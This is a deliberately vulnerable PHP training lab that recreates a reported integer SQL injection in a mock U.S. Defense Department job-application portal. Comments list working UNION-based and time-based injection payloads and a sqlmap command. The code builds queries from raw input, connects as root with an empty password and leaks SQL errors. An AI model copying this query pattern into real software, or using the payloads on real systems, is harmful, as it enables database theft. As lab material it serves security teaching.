<?php
// ============================================================
// SQL Injection Lab 120 — Integer SQLi in DoD FormBuilder entryid
// Platform: U.S. Dept of Defense "Apply Online" Portal
// HackerOne Report #3127198
// Endpoint: POST /actions/formbuilderv2-confirmation.php
//           (X-Requested-With: XMLHttpRequest)
// Injection point: `entryid` POST param — INTEGER, no quotes needed
//
// Attack flow (Burp Repeater):
//   entryid=1                                          → normal entry JSON
//   entryid=1 AND SLEEP(3)                             → ~3s delay confirm
//   entryid=0 UNION SELECT 1,2,3,4 -- -               → injected row
//   entryid=0 UNION SELECT table_name,2,3,4 FROM information_schema.tables -- -
//   entryid=0 UNION SELECT secret_data,2,3,4 FROM lab120_secret -- -  → flag
// ============================================================

$server   = (getenv('DB_HOST') ?: (file_exists('/.dockerenv') ? 'krazeplanet' : '127.0.0.1'));
$username = "root";
$password = "";
$database = "KrazePlanet_DB";

$conn = mysqli_connect($server, $username, $password);
if (!$conn) die(json_encode(["error" => "DB connection failed"]));
mysqli_query($conn, "CREATE DATABASE IF NOT EXISTS $database");
mysqli_select_db($conn, $database);

function initializeLab120Database($conn) {
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab120_form_entries (
        entry_id       INT AUTO_INCREMENT PRIMARY KEY,
        applicant_name VARCHAR(120) NOT NULL,
        useremail      VARCHAR(100) NOT NULL,
        phone          VARCHAR(30)  NOT NULL DEFAULT '',
        clearance      VARCHAR(30)  NOT NULL DEFAULT 'None',
        statement      TEXT,
        submitted_at   DATETIME     NOT NULL
    )");
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab120_secret (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        secret_data VARCHAR(100) NOT NULL
    )");
    $chkS = mysqli_query($conn, "SELECT * FROM lab120_secret LIMIT 1");
    if (mysqli_num_rows($chkS) == 0) {
        mysqli_query($conn, "INSERT INTO lab120_secret (secret_data) VALUES ('flag{dod_formbuilder_sqli_3127198}')");
    }
    $chkE = mysqli_query($conn, "SELECT COUNT(*) AS c FROM lab120_form_entries");
    $r = mysqli_fetch_assoc($chkE);
    if ((int)$r['c'] === 0) {
        mysqli_query($conn, "INSERT INTO lab120_form_entries (applicant_name, useremail, phone, clearance, statement, submitted_at) VALUES
            ('James R. Mitchell',  'j.mitchell@mail.mil',  '703-555-0142', 'Secret',     'Over 8 years in cybersecurity roles within the DoD enterprise.',    '2025-03-10 09:12:00'),
            ('Sarah L. Patterson', 's.patterson@mail.mil', '571-555-0234', 'Top Secret', 'Experienced ISSO with CISSP and DoD 8570 compliance background.',   '2025-03-11 14:35:00'),
            ('David M. Torres',    'd.torres@mail.mil',    '202-555-0378', 'Secret',     'Network security analyst seeking to contribute to DISA operations.', '2025-03-12 10:58:00')");
    }
}
initializeLab120Database($conn);

// ============================================================
// Route 1 — AJAX Confirmation Endpoint (X-Requested-With: XMLHttpRequest)
// POST /index.php  +  X-Requested-With: XMLHttpRequest
// This is the VULNERABLE endpoint from the report
// ============================================================
$isXHR = ($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '') === 'XMLHttpRequest';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $isXHR) {
    header('Content-Type: application/json; charset=utf-8');
    header('X-Powered-By: FormBuilderV2/2.4.1');

    $entryid  = $_POST['entryid']  ?? '';
    $formid   = $_POST['formid']   ?? '1';
    $redirect = $_POST['redirect'] ?? '';

    // ====================================================================
    // ⚠ VULNERABLE — entryid is INTEGER injected raw into WHERE clause
    //   No quotes around $entryid → no need to break out of strings
    //
    //   Normal:  WHERE entry_id = 1
    //   Inject:  WHERE entry_id = 0 UNION SELECT secret_data,2,3,4 FROM lab120_secret -- -
    //   → flag appears in applicant_name field of the JSON response
    //
    //   SQLMap command (from report):
    //   sqlmap -r file3.txt --dbs --tamper=between -p 'entryid' --dbms=mysql --batch
    // ====================================================================
    $sql    = "SELECT entry_id, applicant_name, useremail, submitted_at
               FROM lab120_form_entries
               WHERE entry_id = $entryid";
    $result = mysqli_query($conn, $sql);

    if ($result === false) {
        http_response_code(500);
        echo json_encode([
            "success"  => false,
            "error"    => "Internal Server Error",
            "sqlstate" => mysqli_sqlstate($conn),
            "message"  => mysqli_error($conn)
        ]);
        exit;
    }

    $entry = mysqli_fetch_assoc($result);
    if ($entry) {
        echo json_encode([
            "success"  => true,
            "formid"   => (int)$formid,
            "redirect" => $redirect,
            "entry"    => $entry
        ]);
    } else {
        echo json_encode(["success" => false, "error" => "Entry not found"]);
    }
    exit;
}

// ============================================================
// Route 2 — Form Save (regular POST, no XHR header)
// ============================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isXHR) {
    header('Content-Type: application/json; charset=utf-8');
    $name      = mysqli_real_escape_string($conn, $_POST['applicant_name'] ?? '');
    $email     = mysqli_real_escape_string($conn, $_POST['useremail']       ?? '');
    $phone     = mysqli_real_escape_string($conn, $_POST['phone']           ?? '');
    $clearance = mysqli_real_escape_string($conn, $_POST['clearance']       ?? 'None');
    $statement = mysqli_real_escape_string($conn, $_POST['statement']       ?? '');
    $now       = date('Y-m-d H:i:s');
    if ($name && $email) {
        mysqli_query($conn, "INSERT INTO lab120_form_entries (applicant_name, useremail, phone, clearance, statement, submitted_at)
                             VALUES ('$name','$email','$phone','$clearance','$statement','$now')");
        $newId = mysqli_insert_id($conn);
        echo json_encode(["success" => true, "entryid" => $newId]);
    } else {
        http_response_code(400);
        echo json_encode(["success" => false, "error" => "Name and email required"]);
    }
    exit;
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Apply Online — DoD IT Personnel Portal</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f5f7;color:#212529;font-size:14px;min-height:100vh;display:flex;flex-direction:column;}

/* ── Site Banner ─────────────────────────────────────────────────────────── */
.site-banner{background:#00174f;color:rgba(255,255,255,.55);font-size:.65rem;text-align:center;padding:4px 16px;letter-spacing:.04em;}
.site-banner strong{color:rgba(255,255,255,.8);}

/* ── Header ──────────────────────────────────────────────────────────────── */
header{background:#002855;color:#fff;padding:0;}
.header-inner{display:flex;align-items:center;gap:16px;padding:14px 32px;border-bottom:3px solid #C9A227;}
.dod-seal{width:60px;height:60px;flex-shrink:0;}
.header-titles{flex:1;}
.header-agency{font-size:.68rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:#C9A227;margin-bottom:2px;}
.header-site-name{font-size:1.05rem;font-weight:800;color:#fff;letter-spacing:.01em;}
.header-sub{font-size:.7rem;color:rgba(255,255,255,.55);margin-top:2px;}
.header-right{text-align:right;font-size:.68rem;color:rgba(255,255,255,.5);line-height:1.6;}
.header-right strong{color:rgba(255,255,255,.8);}

/* ── Nav ─────────────────────────────────────────────────────────────────── */
nav.site-nav{background:#003F8A;display:flex;align-items:center;padding:0 32px;}
.nav-item{color:rgba(255,255,255,.7);padding:9px 14px;font-size:.75rem;font-weight:600;cursor:pointer;border-bottom:3px solid transparent;letter-spacing:.03em;text-transform:uppercase;text-decoration:none;white-space:nowrap;}
.nav-item:hover{color:#fff;background:rgba(255,255,255,.06);}
.nav-item.active{color:#fff;border-bottom-color:#C9A227;}

/* ── Breadcrumb ──────────────────────────────────────────────────────────── */
.breadcrumb{background:#e9ecef;border-bottom:1px solid #dee2e6;padding:6px 32px;font-size:.72rem;color:#6c757d;}
.breadcrumb a{color:#003F8A;text-decoration:none;}.breadcrumb a:hover{text-decoration:underline;}
.breadcrumb span{margin:0 5px;color:#adb5bd;}

/* ── Main ────────────────────────────────────────────────────────────────── */
main{flex:1;padding:24px 32px;}
.content-wrap{display:grid;grid-template-columns:1fr 300px;gap:20px;max-width:1100px;margin:0 auto;}

/* ── Form Card ───────────────────────────────────────────────────────────── */
.form-card{background:#fff;border:1px solid #dee2e6;border-radius:3px;overflow:hidden;}
.form-card-header{background:#002855;color:#fff;padding:12px 18px;display:flex;align-items:center;gap:10px;}
.form-card-header svg{width:18px;height:18px;fill:none;stroke:#C9A227;stroke-width:2;}
.form-card-title{font-size:.85rem;font-weight:700;letter-spacing:.02em;}
.form-card-sub{font-size:.65rem;color:rgba(255,255,255,.55);margin-top:1px;}
.form-body{padding:20px 18px;}

.vacancy-banner{background:#f8f9fa;border:1px solid #dee2e6;border-radius:2px;padding:10px 12px;margin-bottom:18px;display:grid;grid-template-columns:1fr 1fr;gap:4px 14px;font-size:.72rem;}
.vb-label{color:#6c757d;font-weight:600;text-transform:uppercase;font-size:.62rem;letter-spacing:.04em;}
.vb-value{color:#212529;font-weight:600;}

.form-group{margin-bottom:14px;}
.form-group label{display:block;font-size:.75rem;font-weight:700;color:#495057;margin-bottom:4px;letter-spacing:.02em;}
.form-group label .req{color:#dc3545;}
.form-group input,.form-group select,.form-group textarea{
  width:100%;padding:7px 10px;border:1px solid #ced4da;border-radius:3px;font-size:.82rem;
  color:#212529;outline:none;font-family:inherit;background:#fff;transition:border-color .12s;
}
.form-group input:focus,.form-group select:focus,.form-group textarea:focus{border-color:#003F8A;box-shadow:0 0 0 2px rgba(0,63,138,.1);}
.form-group textarea{resize:vertical;min-height:80px;}
.form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;}

/* ── Submit Button ───────────────────────────────────────────────────────── */
.btn-submit{background:#002855;color:#fff;border:none;border-radius:3px;padding:10px 20px;font-size:.82rem;font-weight:700;cursor:pointer;font-family:inherit;letter-spacing:.03em;display:inline-flex;align-items:center;gap:7px;transition:background .15s;}
.btn-submit:hover{background:#001a3a;}
.btn-submit svg{width:15px;height:15px;fill:none;stroke:#C9A227;stroke-width:2.5;}
.btn-submit:disabled{opacity:.6;cursor:not-allowed;}
.form-note{font-size:.68rem;color:#6c757d;margin-top:8px;line-height:1.5;}

/* ── Spinner ─────────────────────────────────────────────────────────────── */
.spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;}
@keyframes spin{to{transform:rotate(360deg)}}

/* ── Success State ───────────────────────────────────────────────────────── */
#success-panel{display:none;padding:20px 18px;text-align:center;}
.success-icon{font-size:2.2rem;margin-bottom:10px;}
.success-title{font-size:.95rem;font-weight:700;color:#155724;margin-bottom:6px;}
.success-msg{font-size:.78rem;color:#6c757d;line-height:1.6;margin-bottom:12px;}
.success-ref{font-family:monospace;font-size:.8rem;background:#f8f9fa;border:1px solid #dee2e6;padding:6px 12px;border-radius:3px;color:#495057;display:inline-block;}

/* ── Sidebar ─────────────────────────────────────────────────────────────── */
.sidebar-box{background:#fff;border:1px solid #dee2e6;border-radius:3px;overflow:hidden;margin-bottom:14px;}
.sb-header{background:#003F8A;color:#fff;padding:8px 12px;font-size:.72rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;}
.sb-body{padding:12px;}
.sb-item{font-size:.72rem;color:#495057;padding:5px 0;border-bottom:1px solid #f1f3f5;display:flex;gap:8px;align-items:flex-start;}
.sb-item:last-child{border-bottom:none;}
.sb-item svg{width:12px;height:12px;fill:none;stroke:#003F8A;stroke-width:2;flex-shrink:0;margin-top:1px;}
.security-notice{background:#fff8dc;border:1px solid #ffe066;border-radius:2px;padding:10px 12px;font-size:.7rem;color:#664d03;line-height:1.5;}
.security-notice strong{display:block;margin-bottom:3px;color:#533c00;}

/* ── Footer ──────────────────────────────────────────────────────────────── */
footer{background:#002855;color:rgba(255,255,255,.45);font-size:.65rem;padding:12px 32px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px;border-top:2px solid #C9A227;}
footer a{color:rgba(255,255,255,.45);text-decoration:none;}.footer a:hover{color:#C9A227;}
</style>
</head>
<body>

<!-- Official Banner -->
<div class="site-banner">
  <strong>An official website of the United States Government</strong> &nbsp;|&nbsp;
  This site is protected by DoD cybersecurity measures
</div>

<!-- Header -->
<header>
  <div class="header-inner">
    <svg class="dod-seal" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
      <circle cx="30" cy="30" r="28" fill="#002855" stroke="#C9A227" stroke-width="2"/>
      <circle cx="30" cy="30" r="22" fill="none" stroke="#C9A227" stroke-width="1" stroke-dasharray="3 2"/>
      <!-- Eagle body -->
      <ellipse cx="30" cy="34" rx="8" ry="10" fill="#C9A227"/>
      <!-- Wings -->
      <path d="M5 28 Q18 16 30 28 Q42 16 55 28" fill="#C9A227"/>
      <!-- Head -->
      <circle cx="30" cy="22" r="5" fill="#C9A227"/>
      <!-- Beak -->
      <polygon points="33,22 36,24 33,25" fill="#002855"/>
      <!-- Eye -->
      <circle cx="32" cy="21" r="1" fill="#002855"/>
      <!-- Shield -->
      <rect x="25" y="33" width="10" height="10" rx="1" fill="#002855" stroke="#C9A227" stroke-width=".5"/>
      <rect x="26" y="34" width="8" height="4" fill="#C9A227"/>
      <!-- Stars -->
      <text x="30" y="14" text-anchor="middle" fill="#C9A227" font-size="5" font-family="serif">★ ★ ★</text>
      <text x="30" y="58" text-anchor="middle" fill="#C9A227" font-size="4" font-family="sans-serif" letter-spacing="1">DoD</text>
    </svg>
    <div class="header-titles">
      <div class="header-agency">U.S. Department of Defense</div>
      <div class="header-site-name">IT Personnel Portal</div>
      <div class="header-sub">Defense Information Systems Agency (DISA)</div>
    </div>
    <div class="header-right">
      <strong>Controlled Unclassified Information</strong><br>
      Personnel Division · Recruitment Branch<br>
      Washington D.C., VA 20301
    </div>
  </div>
</header>

<!-- Navigation -->
<nav class="site-nav">
  <a class="nav-item" href="#">Home</a>
  <a class="nav-item" href="#">Vacancies</a>
  <a class="nav-item active" href="#">Apply Online</a>
  <a class="nav-item" href="#">My Applications</a>
  <a class="nav-item" href="#">Benefits</a>
  <a class="nav-item" href="#">Contact</a>
</nav>

<!-- Breadcrumb -->
<div class="breadcrumb">
  <a href="#">Home</a><span>›</span>
  <a href="#">Vacancies</a><span>›</span>
  <a href="#">IT Security Analyst (GS-09/11)</a><span>›</span>
  Apply Online
</div>

<!-- Main Content -->
<main>
<div class="content-wrap">

  <!-- Application Form Card -->
  <div class="form-card">
    <div class="form-card-header">
      <svg viewBox="0 0 24 24"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
      <div>
        <div class="form-card-title">Online Application — Vacancy #DISA-2025-IT-0047</div>
        <div class="form-card-sub">Information Technology Security Analyst · GS-09/11 · Full Time · Washington D.C.</div>
      </div>
    </div>
    <div class="form-body">

      <!-- Vacancy details strip -->
      <div class="vacancy-banner">
        <div><div class="vb-label">Vacancy</div><div class="vb-value">DISA-2025-IT-0047</div></div>
        <div><div class="vb-label">Closing Date</div><div class="vb-value">May 30, 2025</div></div>
        <div><div class="vb-label">Series/Grade</div><div class="vb-value">GS-2210 09/11</div></div>
        <div><div class="vb-label">Work Schedule</div><div class="vb-value">Full Time</div></div>
      </div>

      <!-- Application Form -->
      <form id="applicationForm">
        <div class="form-row">
          <div class="form-group">
            <label>Full Legal Name <span class="req">*</span></label>
            <input type="text" name="applicant_name" placeholder="e.g. James R. Mitchell" required>
          </div>
          <div class="form-group">
            <label>Email Address <span class="req">*</span></label>
            <input type="email" name="useremail" placeholder="your.name@mail.mil" required>
          </div>
        </div>
        <div class="form-row">
          <div class="form-group">
            <label>Phone Number</label>
            <input type="tel" name="phone" placeholder="703-555-0100">
          </div>
          <div class="form-group">
            <label>Current Security Clearance <span class="req">*</span></label>
            <select name="clearance">
              <option value="None">None / Pending</option>
              <option value="Confidential">Confidential</option>
              <option value="Secret" selected>Secret</option>
              <option value="Top Secret">Top Secret</option>
              <option value="TS/SCI">TS/SCI</option>
            </select>
          </div>
        </div>
        <div class="form-group">
          <label>Statement of Interest / Cover Letter <span class="req">*</span></label>
          <textarea name="statement" placeholder="Describe your qualifications and interest in this position (max 500 words)…" required></textarea>
        </div>
        <div id="form-actions">
          <button type="submit" class="btn-submit" id="submitBtn">
            <svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
            Submit Application
          </button>
          <div class="form-note">
            Fields marked <strong style="color:#dc3545">*</strong> are required. By submitting, you certify all information is true and accurate under penalty of federal law.
          </div>
        </div>
      </form>

      <!-- Success panel (hidden until confirmation) -->
      <div id="success-panel">
        <div class="success-icon">&#10003;</div>
        <div class="success-title">Application Submitted Successfully</div>
        <div class="success-msg">
          Your application for <strong>IT Security Analyst (DISA-2025-IT-0047)</strong> has been received.<br>
          You will be contacted at your provided email within 5–7 business days.
        </div>
        <div class="success-ref" id="refCode">Ref #—</div>
      </div>

    </div>
  </div><!-- .form-card -->

  <!-- Sidebar -->
  <div>
    <div class="sidebar-box">
      <div class="sb-header">Position Details</div>
      <div class="sb-body">
        <div class="sb-item"><svg viewBox="0 0 24 24"><path d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/><circle cx="12" cy="11" r="3"/></svg>Pentagon — Arlington, VA</div>
        <div class="sb-item"><svg viewBox="0 0 24 24"><path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>Full Time · Permanent</div>
        <div class="sb-item"><svg viewBox="0 0 24 24"><path d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z"/></svg>Open to U.S. Citizens</div>
        <div class="sb-item"><svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4M7.835 4.697a3.42 3.42 0 001.946-.806 3.42 3.42 0 014.438 0 3.42 3.42 0 001.946.806 3.42 3.42 0 013.138 3.138 3.42 3.42 0 00.806 1.946 3.42 3.42 0 010 4.438 3.42 3.42 0 00-.806 1.946 3.42 3.42 0 01-3.138 3.138 3.42 3.42 0 00-1.946.806 3.42 3.42 0 01-4.438 0 3.42 3.42 0 00-1.946-.806 3.42 3.42 0 01-3.138-3.138 3.42 3.42 0 00-.806-1.946 3.42 3.42 0 010-4.438 3.42 3.42 0 00.806-1.946 3.42 3.42 0 013.138-3.138z"/></svg>Secret Clearance Required</div>
        <div class="sb-item"><svg viewBox="0 0 24 24"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 00-2-2h-4a2 2 0 00-2 2v16"/></svg>Salary: $62,107 – $98,566/year</div>
      </div>
    </div>
    <div class="sidebar-box">
      <div class="sb-header">Required Documents</div>
      <div class="sb-body">
        <div class="sb-item"><svg viewBox="0 0 24 24"><path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>Current Resume (SF-85)</div>
        <div class="sb-item"><svg viewBox="0 0 24 24"><path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>DD-214 (if applicable)</div>
        <div class="sb-item"><svg viewBox="0 0 24 24"><path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>Clearance Verification Letter</div>
        <div class="sb-item"><svg viewBox="0 0 24 24"><path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>College Transcripts</div>
      </div>
    </div>
    <div class="security-notice">
      <strong>&#9888; System Notice</strong>
      This portal uses FormBuilderV2 for application processing.
      Submission data is processed via
      <code style="font-size:.65rem;background:#fff3cd;padding:1px 4px;border-radius:2px;">POST /actions/formbuilderv2-confirmation.php</code>
    </div>
  </div><!-- sidebar -->

</div><!-- .content-wrap -->
</main>

<!-- Footer -->
<footer>
  <span>U.S. Department of Defense · Defense Information Systems Agency (DISA) · IT Personnel Portal v2.4</span>
  <span>
    <a href="https://hackerone.com/reports/3127198" target="_blank" rel="noopener">HackerOne #3127198</a>
    &nbsp;|&nbsp; <a href="#">Privacy Policy</a> &nbsp;|&nbsp; <a href="#">Accessibility</a>
  </span>
</footer>

<script>
document.getElementById('applicationForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    var btn = document.getElementById('submitBtn');
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span> Processing…';

    var form = e.target;
    var body = new URLSearchParams(new FormData(form));

    try {
        // Step 1: Save the application entry (non-XHR POST)
        var saveResp = await fetch('index.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: body.toString()
        });
        var saveData = await saveResp.json();

        if (!saveData.success) throw new Error('Save failed');

        var entryId    = saveData.entryid;
        var userEmail  = form.querySelector('[name=useremail]').value;

        // ================================================================
        // Step 2: Confirmation AJAX call — this is the VULNERABLE request
        // Students intercept this in Burp and modify entryid
        //
        // Request intercepted:
        //   POST /index.php HTTP/1.1
        //   X-Requested-With: XMLHttpRequest
        //   Content-Type: application/x-www-form-urlencoded
        //
        //   entryid=1&formid=1&redirect=/form/apply-online/thank-you&useremail=...
        //
        // Integer injection — no quotes needed:
        //   entryid=0 UNION SELECT secret_data,2,3,4 FROM lab120_secret -- -
        // ================================================================
        var confirmBody = new URLSearchParams({
            entryid:   entryId,
            formid:    '1',
            redirect:  '/form/apply-online/thank-you',
            useremail: userEmail
        });

        var confirmResp = await fetch('index.php', {
            method: 'POST',
            headers: {
                'Content-Type':    'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: confirmBody.toString()
        });
        var confirmData = await confirmResp.json();

        // Show success
        document.getElementById('form-actions').style.display = 'none';
        document.querySelectorAll('.form-group, .vacancy-banner, .form-row').forEach(function(el){ el.style.display = 'none'; });
        var sp = document.getElementById('success-panel');
        sp.style.display = 'block';
        var ref = confirmData.entry ? confirmData.entry.entry_id : entryId;
        document.getElementById('refCode').textContent = 'Application Reference: DISA-2025-' + String(ref).padStart(5,'0');

    } catch(err) {
        btn.disabled = false;
        btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="#C9A227" stroke-width="2.5" width="15" height="15"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg> Submit Application';
        alert('Submission error. Please try again.');
    }
});
</script>

</body>
</html>
